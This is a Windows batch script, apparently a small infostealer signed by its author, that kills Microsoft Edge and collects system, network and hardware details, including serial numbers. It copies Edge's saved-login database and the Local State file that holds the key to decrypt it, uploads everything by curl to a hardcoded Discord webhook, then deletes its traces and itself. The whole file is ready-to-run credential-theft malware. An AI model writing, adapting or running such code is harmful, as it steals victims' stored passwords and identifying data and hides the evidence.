@echo off
echo Hello! Made by Shane.

:: Kill Edge to unlock Login Data
taskkill /f /im msedge.exe 2>nul

:: Collect detailed system information
echo System Information > sysinfo.txt
systeminfo >> sysinfo.txt

:: Network Configuration
echo. >> sysinfo.txt
echo Network Configuration >> sysinfo.txt
ipconfig /all >> sysinfo.txt

:: IPv4 Address
echo. >> sysinfo.txt
echo IPv4 Address >> sysinfo.txt
for /f "tokens=2 delims=:" %%i in ('ipconfig ^| findstr "IPv4 Address"') do echo %%i >> sysinfo.txt

:: IPv6 Address
echo. >> sysinfo.txt
echo IPv6 Address >> sysinfo.txt
for /f "tokens=2 delims=:" %%i in ('ipconfig ^| findstr "IPv6 Address"') do echo %%i >> sysinfo.txt

:: CPU Information
echo. >> sysinfo.txt
echo CPU Information >> sysinfo.txt
wmic cpu get name,description /value >> sysinfo.txt

:: BIOS Information
echo. >> sysinfo.txt
echo BIOS Information >> sysinfo.txt
wmic bios get name,version,serialnumber /value >> sysinfo.txt

:: GPU Information
echo. >> sysinfo.txt
echo GPU Information >> sysinfo.txt
wmic path win32_videocontroller get name,adapterram /value >> sysinfo.txt

:: Motherboard Information
echo. >> sysinfo.txt
echo Motherboard Information >> sysinfo.txt
wmic baseboard get product,manufacturer,serialnumber,version /value >> sysinfo.txt

:: Disk Drives
echo. >> sysinfo.txt
echo Disk Drives >> sysinfo.txt
wmic diskdrive get model,size /value >> sysinfo.txt

:: Memory Information
echo. >> sysinfo.txt
echo Memory Information >> sysinfo.txt
wmic memorychip get capacity,manufacturer,partnumber,speed /value >> sysinfo.txt

:: Copy Edge Login Data and Local State files with retry
set "EDGE_DATA=%LOCALAPPDATA%\Microsoft\Edge\User Data\Default\Login Data"
set "EDGE_STATE=%LOCALAPPDATA%\Microsoft\Edge\User Data\Local State"

if exist "%EDGE_DATA%" (
    :retry
    copy "%EDGE_DATA%" edge_login_data.db >nul
    if not exist edge_login_data.db (
        timeout /t 1 /nobreak >nul
        goto retry
    )
) else (
    echo Edge Login Data NOT found. >> sysinfo.txt
)

if exist "%EDGE_STATE%" (
    copy "%EDGE_STATE%" edge_local_state.json >nul
) else (
    echo Edge Local State NOT found. >> sysinfo.txt
)

:: Set webhook URL
set "WEBHOOK_URL=https://discord.com/api/webhooks/1540227015473631243/D73LkFqH2DrUavolHZw3TeJuEeEivkKrih85dPYobc9wRII4yzQL4_NPLF_r03XgGpyC"

:: Send files to Discord webhook
curl --ssl-no-revoke -F "file=@sysinfo.txt" %WEBHOOK_URL%

if exist edge_login_data.db (
    curl --ssl-no-revoke -F "file=@edge_login_data.db" %WEBHOOK_URL%
)

if exist edge_local_state.json (
    curl --ssl-no-revoke -F "file=@edge_local_state.json" %WEBHOOK_URL%
)

:: Clean up all files
del sysinfo.txt
if exist edge_login_data.db del edge_login_data.db
if exist edge_local_state.json del edge_local_state.json

:: Self-delete the batch file and exit
(goto) 2>nul & del "%~f0" & exit
